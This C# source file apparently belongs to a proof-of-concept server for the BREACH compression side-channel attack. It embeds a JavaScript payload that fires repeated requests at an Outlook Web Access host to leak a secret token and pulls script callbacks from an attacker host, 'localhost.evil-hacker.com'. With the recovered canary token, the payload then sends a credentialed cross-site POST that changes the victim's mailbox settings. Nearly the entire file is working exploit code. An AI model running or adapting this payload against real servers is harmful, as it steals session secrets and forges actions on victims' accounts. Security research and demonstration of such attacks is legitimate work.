using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace BREACHv3Server
{
    class Constants
    {
        internal const string breachJS = @"
function IssueRequest(id)
{

    if (id.indexOf('FINISHED:') == 0) { 
        clearInterval(tokenInProgressInterval);
        window.knownToken = id.replace('FINISHED:', '');
        updateTextArea();
        CORS_CSRF();
        var newValue = ta.value + '\n\n\n---- SECRET FULLY DECRYPTED.\n---- CSRF ATTACK SUCCESSFULLY EXECUTED.\n---- SOCKETS TERMINATED.\n---- ALL SUBSYSTEMS CLEAR.';
        animateFinalText(ta, newValue);

        return;
    }

    var img = new Image(0,0);
    //img.src = 'https://malbot.net/owa/?ae=Item&t=IPM.Note&a=New&id=' + id;
    //img.src = 'https://hispla.com/~breach/poc/?query=blah&duh=banana_' + id;
    
    img.src = 'https://malbot.net/poc/?ae=Item&t=IPM.Note&a=New&id=' + id;

    // synchronous
    img.onerror = function() {
        // img.src = 'https://malbot.net/owa/8.3.83.4/themes/base/clear.gif?id=' + id + '&time=' + Math.round((new Date()).getTime());
        img.onerror = function() {};

        var head = document.getElementsByTagName('head')[0];
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = 'http://localhost.evil-hacker.com:82/CallBack/' + id + '/' + Math.round((new Date()).getTime());
        //script.src = 'http://10.0.41.239:82/CallBack/' + id + '/' + Math.round((new Date()).getTime());


        head.appendChild(script);
        }
}


// Textarea
var ta = document.getElementById('ta');

// Update text
var text = '## Attack payload sequence initiated...\n\n$ sudo make me a sandwhich\r\nmake: *** No rule to make target `me\'. ' +
           'Stop.\n\n$ ./ShatterMilitaryGradeEncryption -crackSSL=true\n> Secret Extracted: !';

// Start animating text (this function lives @ animate.js)
setTimeout('animateText(ta, text)', 1000);

// Update text area with knownToken
function updateTextArea()
{
 var n = ta.value.split("" "");
 if (n[n.length-2] == 'Extracted:')
 {
  ta.value = ta.value.replace(n[n.length-1], '!' + window.knownToken);
 }
}

// Interval to update textarea
var tokenInProgressInterval = setInterval('updateTextArea()',253);


// CORS CSRF Attack
function CORS_CSRF()
{
    var xhr = new XMLHttpRequest();
    var params = 'hidpnst=&selLng=1049&selDtStl=yyyy-MM-dd&selTmStl=HH%3Amm&selTmZn=Pacific+Standard+Time+%28Mexico%29&hidcmdpst=save&hidcanary=' + window.knownToken;
    xhr.open('POST', 'https://malbot.net/owa/?ae=Options&t=Regional', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.withCredentials = true;
    xhr.onerror = function(e) { document.getElementById('breach_title').innerText = '[The BREACH Attack]'; };
    xhr.send(params);
}
";

    }
}
